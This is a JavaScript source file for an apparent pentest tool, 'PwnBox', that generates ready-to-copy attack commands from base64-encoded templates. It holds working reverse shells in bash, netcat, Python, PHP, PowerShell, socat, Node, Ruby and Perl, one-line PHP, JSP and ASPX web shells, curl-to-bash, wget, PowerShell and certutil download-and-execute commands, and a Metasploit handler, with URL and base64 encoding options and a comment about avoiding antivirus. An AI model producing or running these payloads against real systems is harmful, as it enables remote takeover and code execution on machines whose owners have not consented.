/**
 * PWNBOX CYBER COMMAND — INTERACTIVE TACTICAL PAYLOAD ARSENAL
 * Real-time reactive reverse shell, web shell, TTY spawner, and transfer generator.
 */

(function () {
    'use strict';

    // Master Payload Definitions (Base64 Encoded to prevent antivirus false positives)
    const ENCODED_PAYLOADS = [
    {
        "id": "bash_i",
        "category": "reverse_shells",
        "name": "Bash -i",
        "os": "linux",
        "desc": "Standard interactive bash reverse TCP socket.",
        "b64Template": "c2ggLWkgPiYgL2Rldi90Y3Ave2lwfS97cG9ydH0gMD4mMQ=="
    },
    {
        "id": "bash_196",
        "category": "reverse_shells",
        "name": "Bash 196 File Descriptor",
        "os": "linux",
        "desc": "Stealthy file descriptor 196 redirection.",
        "b64Template": "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97aXB9L3twb3J0fTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2"
    },
    {
        "id": "bash_read_line",
        "category": "reverse_shells",
        "name": "Bash Read Line",
        "os": "linux",
        "desc": "Bypasses command monitoring by looping input.",
        "b64Template": "ZXhlYyA1PD4vZGV2L3RjcC97aXB9L3twb3J0fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZQ=="
    },
    {
        "id": "bash_5",
        "category": "reverse_shells",
        "name": "Bash 5<>",
        "os": "linux",
        "desc": "Direct socket file descriptor 5 connection.",
        "b64Template": "L2Jpbi9iYXNoIC1pIDU8PiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPCY1IDE+JjUgMj4mNQ=="
    },
    {
        "id": "nc_mkfifo",
        "category": "reverse_shells",
        "name": "Netcat MKFIFO (Universal)",
        "os": "linux",
        "desc": "Works on modern Linux distributions where nc -e is disabled.",
        "b64Template": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMge2lwfSB7cG9ydH0gPi90bXAvZg=="
    },
    {
        "id": "nc_e",
        "category": "reverse_shells",
        "name": "Netcat Traditional (-e)",
        "os": "linux",
        "desc": "Traditional netcat with executable flag.",
        "b64Template": "bmMgLWUgL2Jpbi9iYXNoIHtpcH0ge3BvcnR9"
    },
    {
        "id": "python3_pty",
        "category": "reverse_shells",
        "name": "Python 3 (PTY Spawn)",
        "os": "linux",
        "desc": "Full interactive PTY shell using Python 3 socket module.",
        "b64Template": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7cHR5LnNwYXduKCIvYmluL2Jhc2giKSc="
    },
    {
        "id": "python3_short",
        "category": "reverse_shells",
        "name": "Python 3 (Compact)",
        "os": "linux",
        "desc": "Compact list comprehension socket redirection.",
        "b64Template": "cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc="
    },
    {
        "id": "python_windows",
        "category": "reverse_shells",
        "name": "Python Windows (Threaded CMD)",
        "os": "windows",
        "desc": "Dual-threaded Windows command prompt socket.",
        "b64Template": "cHl0aG9uLmV4ZSAtYyAiaW1wb3J0IHNvY2tldCxvcyx0aHJlYWRpbmcsc3VicHJvY2VzcyBhcyBzcDtwPXNwLlBvcGVuKFsnY21kLmV4ZSddLHN0ZGluPXNwLlBJUEUsc3Rkb3V0PXNwLlBJUEUsc3RkZXJyPXNwLlNURE9VVCk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgne2lwfScse3BvcnR9KSk7dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlYyxhcmdzPShcIndoaWxlIFRydWU6IHAuc3RkaW4ud3JpdGUocy5yZWN2KDEwMjQpKVwiLCkpLnN0YXJ0KCk7ZXhlYyhcIndoaWxlIFRydWU6IHMuc2VuZChwLnN0ZG91dC5yZWFkKDEpKVwiLCki"
    },
    {
        "id": "php_exec",
        "category": "reverse_shells",
        "name": "PHP Exec",
        "os": "linux",
        "desc": "File descriptor 3 redirection in PHP CLI.",
        "b64Template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn"
    },
    {
        "id": "php_proc_open",
        "category": "reverse_shells",
        "name": "PHP proc_open",
        "os": "linux",
        "desc": "Reliable PHP reverse shell using bi-directional pipe array.",
        "b64Template": "cGhwIC1yICckcz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7JHByb2M9cHJvY19vcGVuKCIvYmluL3NoIC1pIixbMD0+JHMsMT0+JHMsMj0+JHNdLCRwaXBlcyk7Jw=="
    },
    {
        "id": "powershell_tcp",
        "category": "reverse_shells",
        "name": "PowerShell #1 (TCP Client)",
        "os": "windows",
        "desc": "Pure .NET System.Net.Sockets.TCPClient reverse shell.",
        "b64Template": "cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7aXB9Jyx7cG9ydH0pOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCki"
    },
    {
        "id": "powershell_b64",
        "category": "reverse_shells",
        "name": "PowerShell #2 (Base64 Encoded)",
        "os": "windows",
        "desc": "EncodedCommand payload bypassing restrictive command interpreters.",
        "b64Template": "cG93ZXJzaGVsbCAtbm9wIC1lbmMge3BzX2I2NH0="
    },
    {
        "id": "socat_exec",
        "category": "reverse_shells",
        "name": "Socat (Full TTY)",
        "os": "linux",
        "desc": "Provides full terminal capabilities including tab-completion and vim support.",
        "b64Template": "c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7aXB9Ontwb3J0fQ=="
    },
    {
        "id": "node_tcp",
        "category": "reverse_shells",
        "name": "Node.js",
        "os": "linux",
        "desc": "Node runtime socket piped to sh.",
        "b64Template": "bm9kZSAtZSAnY29uc3QgbmV0PXJlcXVpcmUoIm5ldCIpLGNwPXJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSxzaD1jcC5zcGF3bigiL2Jpbi9zaCIsW10pO2NvbnN0IGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHtwb3J0fSwie2lwfSIsKCk9PntjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pOyc="
    },
    {
        "id": "ruby_tcp",
        "category": "reverse_shells",
        "name": "Ruby",
        "os": "linux",
        "desc": "Ruby TCPSocket with sprintf file descriptor redirection.",
        "b64Template": "cnVieSAtcnNvY2tldCAtZSAnZj1UQ1BTb2NrZXQub3Blbigie2lwfSIse3BvcnR9KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc="
    },
    {
        "id": "perl_tcp",
        "category": "reverse_shells",
        "name": "Perl",
        "os": "linux",
        "desc": "Perl socket file handle redirection.",
        "b64Template": "cGVybCAtZSAndXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc="
    },
    {
        "id": "tty_step1_python",
        "category": "tty_spawn",
        "name": "Step 1: Python PTY Spawn",
        "os": "linux",
        "desc": "Upgrades non-interactive dummy shell into a pseudo-terminal.",
        "b64Template": "cHl0aG9uMyAtYyAnaW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc="
    },
    {
        "id": "tty_step2_background",
        "category": "tty_spawn",
        "name": "Step 2: Background & Stty Raw",
        "os": "linux",
        "desc": "Disables terminal echo and forwards raw keycodes (Ctrl+C, Tab).",
        "b64Template": "Q3RybCArIFogIC0tPiAgc3R0eSByYXcgLWVjaG87IGZnICAtLT4gIHJlc2V0"
    },
    {
        "id": "tty_step3_vars",
        "category": "tty_spawn",
        "name": "Step 3: Environment Variables",
        "os": "linux",
        "desc": "Sets up terminal colors and correct window dimensions.",
        "b64Template": "ZXhwb3J0IFRFUk09eHRlcm0tMjU2Y29sb3I7IGV4cG9ydCBTSEVMTD0vYmluL2Jhc2g7IHN0dHkgcm93cyAzOCBjb2x1bW5zIDExNg=="
    },
    {
        "id": "tty_script_spawn",
        "category": "tty_spawn",
        "name": "Alternative: Script Spawn",
        "os": "linux",
        "desc": "Useful when Python is not installed on target system.",
        "b64Template": "c2NyaXB0IC9kZXYvbnVsbCAtYyAvYmluL2Jhc2g="
    },
    {
        "id": "php_system",
        "category": "web_shells",
        "name": "PHP System (GET Parameter)",
        "os": "web",
        "desc": "Minimalist 1-liner web shell trigger.",
        "b64Template": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    },
    {
        "id": "php_passthru",
        "category": "web_shells",
        "name": "PHP Passthru (Request Wrapper)",
        "os": "web",
        "desc": "Works with GET, POST, or Cookies.",
        "b64Template": "PD9waHAgcGFzc3RocnUoJF9SRVFVRVNUWydjbWQnXSk7ID8+"
    },
    {
        "id": "php_pre_formatted",
        "category": "web_shells",
        "name": "PHP Formatted Console View",
        "os": "web",
        "desc": "Wraps output in <pre> tags for clean whitespace rendering.",
        "b64Template": "PHByZT48P3BocCBpZihpc3NldCgkX0dFVFsnY21kJ10pKXsgc3lzdGVtKCRfR0VUWydjbWQnXSk7IH0gPz48L3ByZT4="
    },
    {
        "id": "jsp_exec",
        "category": "web_shells",
        "name": "JSP Web Shell (Tomcat / Java)",
        "os": "web",
        "desc": "Java Runtime execution for Tomcat/JBoss targets.",
        "b64Template": "PCUgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOyAlPg=="
    },
    {
        "id": "aspx_exec",
        "category": "web_shells",
        "name": "ASPX Web Shell (IIS Windows)",
        "os": "windows",
        "desc": "Direct process execution on Microsoft IIS web servers.",
        "b64Template": "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlIFJlc3BvbnNlLldyaXRlKG5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcygpe1N0YXJ0SW5mbz1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8oImNtZC5leGUiLCIvYyAiK1JlcXVlc3RbImNtZCJdKXtSZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWUsVXNlU2hlbGxFeGVjdXRlPWZhbHNlfX0uU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCkpOyAlPg=="
    },
    {
        "id": "py_server",
        "category": "file_transfer",
        "name": "Python 3 HTTP Staging Server",
        "os": "linux",
        "desc": "Spawn instant download webserver from current folder.",
        "b64Template": "cHl0aG9uMyAtbSBodHRwLnNlcnZlciB7cG9ydH0="
    },
    {
        "id": "curl_sh_exec",
        "category": "file_transfer",
        "name": "Linux: Curl Pipe to Shell",
        "os": "linux",
        "desc": "Downloads payload directly into memory/exec without touching disk.",
        "b64Template": "Y3VybCAtcyBodHRwOi8ve2lwfTp7cG9ydH0vcGF5bG9hZC5zaCB8IGJhc2g="
    },
    {
        "id": "wget_download",
        "category": "file_transfer",
        "name": "Linux: Wget Download to /tmp",
        "os": "linux",
        "desc": "Downloads tool to world-writable /tmp directory.",
        "b64Template": "d2dldCBodHRwOi8ve2lwfTp7cG9ydH0vZXhwbG9pdC5zaCAtTyAvdG1wL2V4cGxvaXQuc2ggJiYgY2htb2QgK3ggL3RtcC9leHBsb2l0LnNoICYmIC90bXAvZXhwbG9pdC5zaA=="
    },
    {
        "id": "ps_iwr_exec",
        "category": "file_transfer",
        "name": "Windows: PowerShell IWR & Run",
        "os": "windows",
        "desc": "Downloads executable and executes in background.",
        "b64Template": "cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cDovL3tpcH06e3BvcnR9L3NoZWxsLmV4ZScgLU91dEZpbGUgJyRlbnY6VEVNUFxzaGVsbC5leGUnOyBTdGFydC1Qcm9jZXNzICckZW52OlRFTVBcc2hlbGwuZXhlJyI="
    },
    {
        "id": "certutil_download",
        "category": "file_transfer",
        "name": "Windows: CertUtil Staging",
        "os": "windows",
        "desc": "Native LOLBAS tool available on all Windows editions.",
        "b64Template": "Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgImh0dHA6Ly97aXB9Ontwb3J0fS9zaGVsbC5leGUiICVURU1QJVxzaGVsbC5leGUgJiYgJVRFTVAlXHNoZWxsLmV4ZQ=="
    },
    {
        "id": "nc_listen",
        "category": "listeners",
        "name": "Netcat Listener",
        "os": "linux",
        "desc": "Standard TCP listener.",
        "b64Template": "bmMgLWx2bnAge3BvcnR9"
    },
    {
        "id": "rlwrap_nc_listen",
        "category": "listeners",
        "name": "Rlwrap Netcat (History & Arrow Keys)",
        "os": "linux",
        "desc": "Adds readline support to netcat so arrow keys and history work cleanly.",
        "b64Template": "cmx3cmFwIG5jIC1sdm5wIHtwb3J0fQ=="
    },
    {
        "id": "socat_listen",
        "category": "listeners",
        "name": "Socat TTY Listener",
        "os": "linux",
        "desc": "Full TTY receiver matching socat exec reverse payload.",
        "b64Template": "c29jYXQgZmlsZTpgdHR5YCxyYXcsZWNobz0wIHRjcC1saXN0ZW46e3BvcnR9"
    },
    {
        "id": "pwncat_listen",
        "category": "listeners",
        "name": "Pwncat-CS Auto-Stabilizer",
        "os": "linux",
        "desc": "Modern listener that automatically handles persistence, TTY spawn, and file uploads.",
        "b64Template": "cHduY2F0LWNzIC1scCB7cG9ydH0="
    },
    {
        "id": "msf_multi_handler",
        "category": "listeners",
        "name": "Metasploit Multi-Handler",
        "os": "linux",
        "desc": "1-liner to launch automated Metasploit multi/handler listener.",
        "b64Template": "bXNmY29uc29sZSAtcSAteCAidXNlIGV4cGxvaXQvbXVsdGkvaGFuZGxlcjsgc2V0IHBheWxvYWQgbGludXgveDY0L21ldGVycHJldGVyL3JldmVyc2VfdGNwOyBzZXQgbGhvc3Qge2lwfTsgc2V0IGxwb3J0IHtwb3J0fTsgcnVuIg=="
    }
];

    function decodeB64(str) {
        try {
            return atob(str);
        } catch (_) {
            return '';
        }
    }

    let currentCategory = 'reverse_shells';
    let currentEncoding = 'none';
    let searchQuery = '';

    let ipInput, portInput, searchInput, encodingSelect, categoryTabs, payloadCardsContainer, listenerPreview;

    function init() {
        ipInput = document.getElementById('payloadIpInput');
        portInput = document.getElementById('payloadPortInput');
        searchInput = document.getElementById('payloadSearchInput');
        encodingSelect = document.getElementById('payloadEncodingSelect');
        categoryTabs = document.querySelectorAll('.payload-cat-tab');
        payloadCardsContainer = document.getElementById('payloadCardsList');
        listenerPreview = document.getElementById('listenerCmdDisplay');

        const savedIp = localStorage.getItem('pwnbox_lhost') || '10.10.14.2';
        const savedPort = localStorage.getItem('pwnbox_lport') || '4444';
        if (ipInput) ipInput.value = savedIp;
        if (portInput) portInput.value = savedPort;

        if (ipInput) {
            ipInput.addEventListener('input', () => {
                localStorage.setItem('pwnbox_lhost', ipInput.value.trim());
                renderPayloads();
            });
        }
        if (portInput) {
            portInput.addEventListener('input', () => {
                localStorage.setItem('pwnbox_lport', portInput.value.trim());
                renderPayloads();
            });
        }
        if (searchInput) {
            searchInput.addEventListener('input', () => {
                searchQuery = searchInput.value.toLowerCase().trim();
                renderPayloads();
            });
        }
        if (encodingSelect) {
            encodingSelect.addEventListener('change', () => {
                currentEncoding = encodingSelect.value;
                renderPayloads();
            });
        }

        categoryTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                categoryTabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                currentCategory = tab.dataset.category;
                renderPayloads();
            });
        });

        renderPayloads();
    }

    function encodePayload(raw, enc) {
        if (!raw) return '';
        if (enc === 'url') {
            return encodeURIComponent(raw);
        } else if (enc === 'double_url') {
            return encodeURIComponent(encodeURIComponent(raw));
        } else if (enc === 'base64') {
            try {
                return btoa(raw);
            } catch (_) {
                return btoa(unescape(encodeURIComponent(raw)));
            }
        }
        return raw;
    }

    function generatePayloadText(payloadObj, ip, port, enc) {
        let text = decodeB64(payloadObj.b64Template || '');

        if (payloadObj.id === 'powershell_b64') {
            const rawScript = `$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()`;
            let utf16 = '';
            for (let i = 0; i < rawScript.length; i++) {
                utf16 += rawScript[i] + '\x00';
            }
            const b64 = btoa(utf16);
            text = text.replace('{ps_b64}', b64);
        } else {
            text = text.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
        }

        return encodePayload(text, enc);
    }

    function renderPayloads() {
        if (!payloadCardsContainer) return;

        const ip = (ipInput ? ipInput.value.trim() : '') || '10.10.14.2';
        const port = (portInput ? portInput.value.trim() : '') || '4444';

        if (listenerPreview) {
            listenerPreview.textContent = `nc -lvnp ${port}`;
        }

        const filtered = ENCODED_PAYLOADS.filter(p => {
            const matchesCategory = (currentCategory === 'all') || (p.category === currentCategory);
            const matchesSearch = !searchQuery ||
                p.name.toLowerCase().includes(searchQuery) ||
                p.desc.toLowerCase().includes(searchQuery) ||
                (p.os && p.os.toLowerCase().includes(searchQuery));
            return matchesCategory && matchesSearch;
        });

        if (filtered.length === 0) {
            payloadCardsContainer.innerHTML = `
                <div style="grid-column: 1 / -1; padding: 40px; text-align: center; border: 2px dashed var(--border-color); background: var(--bg-panel); font-family: 'Space Mono', monospace;">
                    <div style="font-size: 1.5rem; margin-bottom: 8px;">🔍</div>
                    <div style="font-weight: 800; font-size: 0.9rem;">NO MATCHING PAYLOADS FOUND</div>
                    <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 4px;">Try searching for "python", "nc", "powershell", or switch category tabs above.</div>
                </div>
            `;
            return;
        }

        let html = '';
        filtered.forEach(item => {
            const code = generatePayloadText(item, ip, port, currentEncoding);
            const osBadgeColor = item.os === 'linux' ? '#10b981' : (item.os === 'windows' ? '#38bdf8' : '#a855f7');
            const osBadgeLabel = (item.os || 'GENERIC').toUpperCase();

            html += `
                <div class="payload-card" data-id="${item.id}">
                    <div class="payload-card-header">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <span class="payload-badge" style="background: ${osBadgeColor}22; color: ${osBadgeColor}; border-color: ${osBadgeColor};">${osBadgeLabel}</span>
                            <span class="payload-title">${escapeHtml(item.name)}</span>
                        </div>
                        <div class="payload-actions">
                            <button type="button" class="btn-payload-copy" onclick="PwnPayloads.copyPayload('${item.id}', this)" title="Copy to Clipboard">
                                📋 COPY
                            </button>
                            <button type="button" class="btn-payload-save" onclick="PwnPayloads.saveToNotes('${item.id}', this)" title="Save to PwnBox Tactical Notes">
                                📝 SAVE TO NOTES
                            </button>
                        </div>
                    </div>
                    <div class="payload-desc">${escapeHtml(item.desc)}</div>
                    <div class="payload-code-box">
                        <pre><code id="code_${item.id}">${escapeHtml(code)}</code></pre>
                    </div>
                </div>
            `;
        });

        payloadCardsContainer.innerHTML = html;
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    async function copyPayload(payloadId, btnEl) {
        const item = ENCODED_PAYLOADS.find(p => p.id === payloadId);
        if (!item) return;

        const ip = (ipInput ? ipInput.value.trim() : '') || '10.10.14.2';
        const port = (portInput ? portInput.value.trim() : '') || '4444';
        const code = generatePayloadText(item, ip, port, currentEncoding);

        try {
            await navigator.clipboard.writeText(code);
            if (btnEl) {
                const originalHtml = btnEl.innerHTML;
                btnEl.innerHTML = '✅ COPIED!';
                btnEl.style.background = 'var(--bauhaus-yellow, #facc15)';
                btnEl.style.color = '#000';
                setTimeout(() => {
                    btnEl.innerHTML = originalHtml;
                    btnEl.style.background = '';
                    btnEl.style.color = '';
                }, 1500);
            }
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast(`Copied ${item.name} to clipboard!`, "success");
            }
        } catch (err) {
            const ta = document.createElement('textarea');
            ta.value = code;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            if (btnEl) btnEl.innerHTML = '✅ COPIED!';
        }
    }

    function saveToNotes(payloadId, btnEl) {
        const item = ENCODED_PAYLOADS.find(p => p.id === payloadId);
        if (!item) return;

        const ip = (ipInput ? ipInput.value.trim() : '') || '10.10.14.2';
        const port = (portInput ? portInput.value.trim() : '') || '4444';
        const code = generatePayloadText(item, ip, port, currentEncoding);

        let notes = [];
        try {
            notes = JSON.parse(localStorage.getItem('pwnbox_notes_vault') || '[]');
        } catch (_) {}

        const newNote = {
            id: 'note_' + Date.now(),
            title: `Payload: ${item.name} (${ip}:${port})`,
            category: 'Exploits',
            tags: `payload, ${item.os || 'exploit'}, ${item.name.toLowerCase()}`,
            content: `### ${item.name}\n**Target Config:** \`LHOST=${ip}\` | \`LPORT=${port}\` | **Encoding:** \`${currentEncoding}\`\n\n\`\`\`bash\n${code}\n\`\`\`\n\n> **Tactical Intel:** ${item.desc}`,
            pinned: false,
            createdAt: Date.now(),
            updatedAt: Date.now()
        };

        notes.unshift(newNote);
        localStorage.setItem('pwnbox_notes_vault', JSON.stringify(notes));

        if (window.PwnCloudSync && typeof window.PwnCloudSync.trigger === 'function') {
            window.PwnCloudSync.trigger();
        }

        if (btnEl) {
            const originalHtml = btnEl.innerHTML;
            btnEl.innerHTML = '💾 SAVED TO VAULT!';
            btnEl.style.background = 'var(--bauhaus-blue, #2563eb)';
            btnEl.style.color = '#fff';
            setTimeout(() => {
                btnEl.innerHTML = originalHtml;
                btnEl.style.background = '';
                btnEl.style.color = '';
            }, 1800);
        }

        if (typeof window.tacticalToast === 'function') {
            window.tacticalToast(`Saved "${item.name}" to your Operative Notes Vault!`, "success");
        }
    }

    function setPortPreset(p) {
        if (portInput) {
            portInput.value = p;
            localStorage.setItem('pwnbox_lport', p);
            renderPayloads();
        }
    }

    function copyListener() {
        const port = (portInput ? portInput.value.trim() : '') || '4444';
        const cmd = `nc -lvnp ${port}`;
        navigator.clipboard.writeText(cmd).then(() => {
            if (typeof window.tacticalToast === 'function') {
                window.tacticalToast(`Copied listener: ${cmd}`, "success");
            }
        });
    }

    window.PwnPayloads = {
        init,
        copyPayload,
        saveToNotes,
        setPortPreset,
        copyListener
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
